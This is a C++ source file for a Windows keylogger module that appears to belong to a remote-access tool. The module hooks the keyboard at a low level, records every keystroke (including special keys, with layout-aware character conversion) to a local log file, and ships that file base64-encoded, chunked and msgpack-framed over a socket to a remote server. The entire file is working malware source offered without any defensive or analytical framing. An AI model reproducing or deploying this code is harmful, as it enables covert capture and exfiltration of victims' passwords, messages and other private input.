#include "keylogger_module.h"
#include <iostream>
#include <fstream>
#include <windows.h>
#include <thread>
#include <chrono>
#include <iomanip>
#include <ctime>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI KeyloggerThread(LPVOID lpParam);
std::string getKeyboardLayoutName();
std::string getActualCharacter(int vkCode, BYTE keyboardState[256]);
std::string logNonPrintableKeys(int vkCode);
std::string getCurrentDateTime();
void ensureNewlineBeforeAppend(const std::string& filename, std::ofstream& outFile);

HANDLE hThread = nullptr;
HHOOK keyboardHook;
std::ofstream logFile;
std::string fileName = "keylog.txt";

bool shouldQuit = false;

const char* Keylogger_Module::name() const {
    return "Keylogger Module";
}

void Keylogger_Module::run(){
    std::cout << "Keylogger Module Started" << std::endl;
    shouldQuit = false;

    hThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
}

void Keylogger_Module::stopKeylogger(){
    shouldQuit = true;
    if(hThread){
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        hThread = nullptr;
    }
}

DWORD WINAPI KeyloggerThread(LPVOID lpParam){
    logFile.open(fileName, std::ios::app);

    if(!logFile.is_open()){
        std::cerr << "Failed to open log file!" << std::endl;
        return 1;
    }

    //SET UP THE HOOK
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if(!keyboardHook){
        std::cerr << "Failed to install keyboard hook! Error: " << GetLastError() << std::endl;
        return 1;
    }

    ensureNewlineBeforeAppend(fileName, logFile);
    logFile << "=== Keylogger Session Started ===" << getCurrentDateTime() << "===" << std::endl;
    logFile << "Keyboard Layout: " << getKeyboardLayoutName() << std::endl;

    logFile.flush();
    
    //GETS THE ACTION MESSAGES AND CONVERTES IT TO UNICODE CHARS. FOR INSTANCE: VK_SHIFT + VK_A => 'A'
    MSG msg;
    while(true){
        while(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)){
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (shouldQuit) {
            break;
        }

        Sleep(10);
    }
    

    UnhookWindowsHookEx(keyboardHook);
    logFile << "\n=== Keylogger Session Ended ===" << getCurrentDateTime() << "===" << std::endl;
    logFile.close();
    
    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if(nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)){
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;

        std::string specialKey = logNonPrintableKeys(vkCode);
        if(!specialKey.empty() && specialKey[0] == '['){
            logFile << specialKey;
        }
        else{
            BYTE keyboardState[256] = {0};
            GetKeyboardState(keyboardState);

            bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool isCapsOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            if(isShiftPressed) keyboardState[VK_SHIFT] |= 0x80;
            if(isCapsOn) keyboardState[VK_CAPITAL] |= 0x01;

            //GET THE KEY AND CONVERT IT TO UTF8
            std::string key = getActualCharacter(vkCode, keyboardState);

            if(!key.empty()){
                logFile << key;
            }
        }

        logFile.flush();
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

std::string getKeyboardLayoutName() {
    HKL layout = GetKeyboardLayout(0);
    LANGID langId = LOWORD(layout);
    
    char layoutName[256];
    if (GetLocaleInfoA(MAKELCID(langId, SORT_DEFAULT), LOCALE_SENGLANGUAGE, 
                      layoutName, sizeof(layoutName))) {
        return std::string(layoutName);
    }
    return "Unknown";
}

//CONVERTS VKCODE TO UTF8 CHARACTERS
std::string getActualCharacter(int vkCode, BYTE keyboardState[256]) {
    HKL keyboardLayout = GetKeyboardLayout(0);

    // Convert virtual key to scan code
    UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, keyboardLayout);

    // Get Unicode character
    wchar_t unicodeBuffer[3] = {0};
    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeBuffer, 2, 0, keyboardLayout);

    if (result > 0) {
        // Convert Unicode to UTF-8
        char utf8Buffer[8] = {0};
        int utf8Length = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, result, 
                                             utf8Buffer, sizeof(utf8Buffer) - 1, NULL, NULL);
        if (utf8Length > 0) {
            return std::string(utf8Buffer, utf8Length);
        }
    }

    return "";
}

//RETURNS SPECIAL KEYS
std::string logNonPrintableKeys(int vkCode){
    switch(vkCode){
                case VK_BACK: return "[BACKSPACE]";
                case VK_TAB: return "[TAB]";
                case VK_RETURN: return "[ENTER]";
                case VK_SHIFT: return "[SHIFT]";
                case VK_CONTROL: return "[CTRL]";
                case VK_MENU: return "[ALT]";
                case VK_PAUSE: return "[PAUSE]";
                case VK_CAPITAL: return "[CAPS_LOCK]";
                case VK_ESCAPE: return "[ESC]";
                case VK_SPACE: return " ";
                case VK_PRIOR: return "[PAGE_UP]";
                case VK_NEXT: return "[PAGE_DOWN]";
                case VK_END: return "[END]";
                case VK_HOME: return "[HOME]";
                case VK_LEFT: return "[ARROW_LEFT]";
                case VK_UP: return "[ARROW_UP]";
                case VK_RIGHT: return "[ARROW_RIGHT]";
                case VK_DOWN: return "[ARROW_DOWN]";
                case VK_INSERT: return "[INSERT]";
                case VK_DELETE: return "[DELETE]";
                case VK_F1: return "[F1]";
                case VK_F2: return "[F2]";
                case VK_F3: return "[F3]";
                case VK_F4: return "[F4]";
                case VK_F5: return "[F5]";
                case VK_F6: return "[F6]";
                case VK_F7: return "[F7]";
                case VK_F8: return "[F8]";
                case VK_F9: return "[F9]";
                case VK_F10: return "[F10]";
                case VK_F11: return "[F11]";
                case VK_F12: return "[F12]";
                // Numpad keys
                case VK_NUMPAD0: return "0";
                case VK_NUMPAD1: return "1";
                case VK_NUMPAD2: return "2";
                case VK_NUMPAD3: return "3";
                case VK_NUMPAD4: return "4";
                case VK_NUMPAD5: return "5";
                case VK_NUMPAD6: return "6";
                case VK_NUMPAD7: return "7";
                case VK_NUMPAD8: return "8";
                case VK_NUMPAD9: return "9";
                case VK_MULTIPLY: return "*";
                case VK_ADD: return "+";
                case VK_SUBTRACT: return "-";
                case VK_DECIMAL: return ".";
                case VK_DIVIDE: return "/";
                default:
                    return "";
    }
}

//CHECKS IF THERE IS A LOG FILE OR THE LOG FILE THAT CURRENTLY EXISTS IS EMPTY OR NOT
void ensureNewlineBeforeAppend(const std::string& filename, std::ofstream& outFile) {
    std::ifstream inFile(filename, std::ios::binary);

    if (!inFile) return;

    inFile.seekg(0, std::ios::end);
    if (inFile.tellg() == 0) return;

    inFile.seekg(-1, std::ios::end); 
    char lastChar;
    inFile.get(lastChar);

    if (lastChar != '\n' && lastChar != '\r') {
        outFile << "\r\n";
    }
}

std::string getCurrentDateTime() {
    auto now = std::chrono::system_clock::now();
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);

    std::tm tm_buf;

    localtime_s(&tm_buf, &now_time);

    std::ostringstream oss;
    oss << std::put_time(&tm_buf, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

std::string& Keylogger_Module::getKeylogFileName(){
    return fileName;
}

bool Keylogger_Module::sendFileViaMsgPack(SOCKET sock, std::string& fileName){
    std::ifstream file(fileName, std::ios::binary);
        if(!file.is_open()){
            std::cerr << "Couldn't open file" << fileName << std::endl;
            return false;
        }

        file.seekg(0, std::ios::end);
        size_t filesize = file.tellg();
        file.seekg(0, std::ios::beg);

        std::vector<char> filedata(filesize);
        file.read(filedata.data(), filesize);
        file.close();

        // For large files, we should chunk them
        if (filesize > 64 * 1024) { // 64KB limit for single message
            std::cout << "[Info] Large file (" << filesize << " bytes) - using chunked transfer" << std::endl;
            return sendFileInChunks(sock, fileName, filedata);
        }

        std::string base64_data = base64_encode(filedata);

        // Send file as a single message
        std::string file_message = "KEYLOGGER_DATA:" + base64_data;
        return send_message(sock, file_message);
}

bool Keylogger_Module::sendFileInChunks(SOCKET sock, std::string& filename, const std::vector<char>& filedata){
    const size_t chunk_size = 512; // 512 bytes chunks to stay well under msgpack 1024 limit
    size_t total_chunks = (filedata.size() + chunk_size - 1) / chunk_size;
    
    std::cout << "[Info] Sending file in " << total_chunks << " chunks of " << chunk_size << " bytes each" << std::endl;
    
    // Send file header
    std::string header = "FILE_START:" + std::string(filename) + ":" + std::to_string(filedata.size()) + ":" + std::to_string(total_chunks);
    if (!send_message(sock, header)) return false;
    
    // Send chunks
    for (size_t i = 0; i < total_chunks; ++i) {
        size_t start = i * chunk_size;
        size_t end = std::min(start + chunk_size, filedata.size());
        
        std::vector<char> chunk(filedata.begin() + start, filedata.begin() + end);
        std::string base64_chunk = base64_encode(chunk);
        
        std::string chunk_message = "FILE_CHUNK:" + std::to_string(i) + ":" + base64_chunk;
        if (!send_message(sock, chunk_message)) {
            std::cerr << "[Error] Failed to send chunk " << i << "/" << total_chunks << std::endl;
            return false;
        }
        
        // Show progress every 50 chunks
        if (i % 50 == 0 || i == total_chunks - 1) {
            std::cout << "[Progress] Sent chunk " << (i + 1) << "/" << total_chunks << std::endl;
        }
        
        // Small delay between chunks to avoid overwhelming the connection
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    
    std::cout << "[Success] File transfer completed - " << total_chunks << " chunks sent" << std::endl;
    
    // Send file end marker
    std::string end_message = "FILE_END:" + std::string(filename);
    return send_message(sock, end_message);
}


std::string Keylogger_Module::base64_encode(const std::vector<char>& data){
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    int val = 0, valb = -6;
    
    for (char c : data) {
        val = (val << 8) + (unsigned char)c;
        valb += 8;
        while (valb >= 0) {
            result.push_back(chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) {
        result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (result.size() % 4) {
        result.push_back('=');
    }
    return result;
}

bool Keylogger_Module::send_message(SOCKET sock, const std::string& msg){
    std::vector<char> formatted_msg = create_message(msg);
    return send(sock, formatted_msg.data(), static_cast<int>(formatted_msg.size()), 0) != SOCKET_ERROR;
}

std::vector<char> Keylogger_Module::create_message(const std::string& content) {
    // Create msgpack format: [{"content": "message"}]
    // This is a simplified approach that works with the Python server
    
    std::vector<char> result;
    
    // Array with 1 element (fixarray format: 0x91)
    result.push_back(0x91);
    
    // Map with 1 key-value pair (fixmap format: 0x81)  
    result.push_back(0x81);
    
    // Key: "content" (7 chars, fixstr: 0xa7)
    result.push_back(0xa7);
    result.insert(result.end(), {'c','o','n','t','e','n','t'});
    
    // Value: message content
    if (content.length() < 32) {
        // fixstr format (0xa0 + length)
        result.push_back(0xa0 + static_cast<char>(content.length()));
        result.insert(result.end(), content.begin(), content.end());
    } else if (content.length() < 256) {
        // str8 format  
        result.push_back(0xd9);
        result.push_back(static_cast<char>(content.length()));
        result.insert(result.end(), content.begin(), content.end());
    } else {
        // str16 format
        result.push_back(0xda);
        result.push_back(static_cast<char>((content.length() >> 8) & 0xFF));
        result.push_back(static_cast<char>(content.length() & 0xFF));
        result.insert(result.end(), content.begin(), content.end());
    }
    
    return result;
}